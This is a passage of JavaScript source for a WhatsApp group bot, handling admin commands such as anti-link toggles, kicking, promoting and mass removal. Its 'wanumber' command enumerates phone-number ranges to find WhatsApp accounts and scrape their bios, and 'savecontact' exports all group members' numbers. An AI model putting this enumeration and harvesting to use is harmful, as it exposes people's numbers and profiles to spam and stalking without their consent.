if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antilocation = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilocation = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilink': {
               if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antilink = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilink = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'antilinkgc': {
               if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'antipromotion': {
               if (!m.isGroup) return aespispStickGroup()
if (!isBotAdmins) return aespispStickBotAdmin()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antipromotion = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipromotion = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'welcome':
            case 'left': {
               if (!m.isGroup) return aespispStickGroup()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               if (args[0] === 'on') {
                  welcome = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  welcome = false
                  replygcaespisp(`${command} is disabled`)
               }else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'adminevent': {
               if (!m.isGroup) return aespispStickGroup()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               if (args[0] === 'on') {
                  adminevent = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  adminevent = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
case 'groupevent': {
               if (!m.isGroup) return aespispStickGroup()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
               if (args[0] === 'on') {
                  groupevent = true
                  replygcaespisp(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  groupevent = false
                  replygcaespisp(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break 
            case 'invite': {
	if (!m.isGroup) return aespispStickGroup()
	if (!isBotAdmins) return aespispStickBotAdmin()
if (!text) return replygcaespisp(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 916909137213`)
if (text.includes('+')) return replygcaespisp(`Enter the number together without *+*`)
if (isNaN(text)) return replygcaespisp(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await ArielStore.groupInviteCode(group)
      await ArielStore.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replygcaespisp(` An invite link is sent to the user`) 
}
break
            case 'closetime':
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcaespisp('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                }
                replygcaespisp(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    ArielStore.groupSettingUpdate(m.chat, 'announcement')
                    replygcaespisp(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !aespispTheCreator) return replygcaespisp(mess.admin)
                if (!isBotAdmins) return aespispStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcaespisp('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                replygcaespisp(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    ArielStore.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcaespisp(open)
                }, timer)
                break
            case 'kick':
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ArielStore.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                replygcaespisp(mess.done)
                break

                case "idgroup": case "groupid": {
if (!aespispTheCreator) return aespispStickOwner()
let getGroups = await ArielStore.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await ArielStore.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
replygcaespisp(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
}
break
case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return replygcaespisp(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcaespisp(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await ArielStore.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await ArielStore.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcaespisp(`${text66}${nobio}${nowhatsapp}`)
        }
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return aespispStickGroup()
if (!(isGroupAdmins || aespispTheCreator)) return aespispStickAdmin()
aespispbigpp = await ArielStore.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
ArielStore.sendContact(m.chat, participants.map(a => a.id), aespispbigpp)
}
break
case 'savecontact': case 'svcontact':{
if (!m.isGroup) return aespispStickGroup()
if (!(isGroupAdmins || aespispTheCreator)) return aespispStickAdmin()
let cmiggc = await ArielStore.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
replygcaespisp('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
ArielStore.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return aespispStickGroup()
if (!m.mentionedJid[0]) return replygcaespisp('\nUse like this\n Example:.sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
ArielStore.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return aespispStickGroup()
if (!(isGroupAdmins || aespispTheCreator)) return aespispStickAdmin()
if (!m.mentionedJid[0]) return replygcaespisp('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
ArielStore.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
            case 'add':
                if (!m.isGroup) return aespispStickGroup()
                if(!aespispTheCreator) return aespispStickOwner()
                if (!isBotAdmins) return aespispStickBotAdmin()
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ArielStore.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                replygcaespisp(mess.done)
                break
            case 'promote':
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ArielStore.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                replygcaespisp(mess.done)
                break
            case 'demote':
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await ArielStore.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                replygcaespisp(mess.done)
                break
            case 'setnamegc':
            case 'setsubject':
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                if (!text) return replygcaespisp('Text ?')
                await ArielStore.groupUpdateSubject(m.chat, text)
                replygcaespisp(mess.done)
                break
                case 'userjid':{
          	if(!aespispTheCreator) return aespispStickOwner()
        const groupMetadata = m.isGroup ? await ArielStore.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replygcaespisp(textt)
    }
    break
    case 'creategc': case 'creategroup': {
if (!aespispTheCreator) return aespispStickOwner()
if (!args.join(" ")) return replygcaespisp(`Use ${prefix+command} groupname`)
try {
let cret = await ArielStore.groupCreate(args.join(" "), [])
let response = await ArielStore.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
ArielStore.sendMessage(m.chat, { text:teksop, mentions: await ArielStore.parseMention(teksop)}, {quoted:m})
} catch {
	replygcaespisp(`Error`)
	}
}
break
    case 'setbotbio':{
if (!aespispTheCreator) return aespispStickOwner()
if (!text) return replygcaespisp(`Where is the text?\nExample: ${prefix + command} Aespi Botz`)
    await ArielStore.updateProfileStatus(text)
    replygcaespisp(`Success in changing the bio of bot's number`)
    }
    break
    case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return aespispStickGroup()
if (!isAdmins && !aespispTheCreator) return aespispStickAdmin()
if (!isBotAdmins) return aespispStickBotAdmin()
    await ArielStore.removeProfilePicture(from)
    }
    break
    case 'deleteppbot': case 'delppbot': {
if (!aespispTheCreator) return aespispStickOwner()
    await ArielStore.removeProfilePicture(ArielStore.user.id)
    replygcaespisp(`Success in deleting bot's profile picture`)
    }
    break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                if (!text) return replygcaespisp('Text ?')
                await ArielStore.groupUpdateDescription(m.chat, text)
                replygcaespisp(mess.done)
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins) return replygcaespisp(mess.admin)
                if (!isBotAdmins) return aespispStickBotAdmin()
                if (!quoted) return replygcaespisp(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcaespisp(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcaespisp(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await ArielStore.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await ArielStore.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcaespisp(mess.done)
                } else {
                    var memeg = await ArielStore.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcaespisp(mess.done)
                }
                break
            case 'tagall':
            case 'tag':
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                let me = m.sender
                let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                ArielStore.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'kickall': {
 if (!m.isGroup) return aespispStickGroup()
 if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
 if (!isBotAdmins) return aespispStickBotAdmin()
  const aespispkickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
  }
 for (let remove of aespispkickall) {
 await ArielStore.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 replygcaespisp(`Success`);
}
break
case 'promoteall': {
 if (!m.isGroup) return aespispStickGroup()
 if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
 if (!isBotAdmins) return aespispStickBotAdmin()
  const aespisppromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
